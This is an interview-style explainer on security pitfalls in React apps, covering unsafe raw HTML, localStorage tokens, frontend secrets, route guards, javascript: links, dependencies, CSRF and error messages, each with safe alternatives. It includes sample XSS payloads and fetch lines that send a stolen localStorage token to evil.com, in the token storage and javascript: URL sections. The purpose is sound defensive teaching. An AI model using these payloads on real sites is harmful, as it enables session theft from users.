444. What Security Concerns Are Specific To React Apps?

One-Line Definition

React is secure by default against many XSS cases, but React apps can still become vulnerable because of unsafe HTML rendering, insecure APIs, exposed secrets, bad token storage, dependency issues, and poor routing or authorization checks.

Simple Idea

React Protects JSX
↓
Developer Uses Unsafe Pattern
↓
Browser Executes Bad Code
↓
Security Issue Happens

1. XSS Using dangerouslySetInnerHTML

React normally escapes values inside JSX. But dangerouslySetInnerHTML tells React to insert raw HTML directly into the page.

Unsafe Example
function Comment({ comment }) {
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
}
If comment comes from user input, an attacker can insert malicious HTML or JavaScript.
Attacker Input
<img src="x" onerror="alert('Hacked')" />
Safe Example
function Comment({ comment }) {
  return <div>{comment}</div>;
}
JSX with curly braces escapes HTML by default, so the script is shown as text instead of being executed.

2. Storing Tokens In localStorage

Many React apps store login tokens in localStorage. This is risky because JavaScript can read localStorage.

Risky Token Storage
localStorage.setItem('token', token);
If XSS happens, attacker JavaScript can read this token and send it outside.
Attacker Script
const token = localStorage.getItem('token');
fetch('https://evil.com/steal?token=' + token);
Better approach: use secure, HttpOnly cookies for sensitive tokens when possible.

3. Exposing Secrets In Frontend Code

React code runs in the browser. Anything inside React frontend code can be seen by users.

Bad Example
const API_SECRET = 'my-private-secret-key';
Never put private API keys, database passwords, or server secrets inside React code.
Keep secrets on the backend. React should call your backend, and backend should call protected services.

4. Trusting Frontend Route Protection Only

React route guards only hide pages in the UI. They do not protect real backend data.

Frontend Route Guard
if (!user) return <Navigate to="/login" />;
return <AdminDashboard />;
This protects the screen, not the API. A user can still call the API directly from browser tools or Postman.
Backend Must Also Check
app.get('/api/admin', verifyToken, verifyAdmin, (req, res) => {
  res.json({ data: 'admin data' });
});

5. Unsafe User URLs

If you render user-provided links, attackers may try dangerous URLs like javascript:.

Unsafe Link
function ProfileLink({ url }) {
  return <a href={url}>Visit Profile</a>;
}
Dangerous Input
javascript:alert('Hacked')
Safer Check
function isSafeUrl(url) {
  return url.startsWith('https://') || url.startsWith('http://');
}

How javascript: URLs Become Dangerous

An attacker cannot directly access your application data from another computer. However, if a user clicks a javascript: link, the browser executes that JavaScript in your application's context.

Malicious URL
javascript:fetch(
  'https://evil.com/steal?token=' +
  localStorage.getItem('token')
)
When the user clicks this link, the JavaScript runs inside the current page and can access anything that normal JavaScript can access, including localStorage, sessionStorage, and page data.
Attack Flow
User Clicks javascript: Link
↓
Browser Executes JavaScript
↓
Reads localStorage Token
↓
Sends Token To Attacker
The danger is not the URL itself. The danger is that the browser treats javascript: as executable code and runs it with the same permissions as your application.

6. Third-Party Package Vulnerabilities

React apps usually depend on many npm packages. A vulnerable package can create security problems.

Check Dependencies
npm audit
Keep dependencies updated and avoid unknown packages with low trust.

7. CSRF With Cookie-Based Auth

If your React app uses cookies for authentication, browsers automatically send cookies with requests. Attackers may try to trigger unwanted actions from another site.

Protection Ideas
Use SameSite cookies
Use CSRF tokens
Validate Origin / Referer on backend
Require proper authentication checks

8. Insecure API Error Messages

Do not expose sensitive backend details in frontend error messages.

Bad Error
{
  "error": "Database password failed for user root"
}
Better Error
{
  "error": "Something went wrong"
}

Best Practices

  • Avoid dangerouslySetInnerHTML unless absolutely required.
  • Sanitize HTML before rendering user-generated HTML.
  • Never store private secrets in React code.
  • Do not depend only on React route guards for security.
  • Validate permissions on the backend.
  • Be careful with localStorage token storage.
  • Keep npm packages updated.
  • Validate user-provided URLs.

Interview Answer

React apps can have security concerns such as XSS through dangerouslySetInnerHTML, unsafe token storage in localStorage, exposed frontend secrets, unsafe user-provided URLs, dependency vulnerabilities, CSRF with cookie-based auth, and relying only on frontend route protection. React escapes JSX values by default, but developers must avoid unsafe raw HTML rendering and always validate authorization and sensitive actions on the backend.

One-Line Interview Answer

React is safe by default for JSX rendering, but React apps become vulnerable when developers use unsafe HTML, store sensitive data insecurely, expose secrets, or rely only on frontend checks.
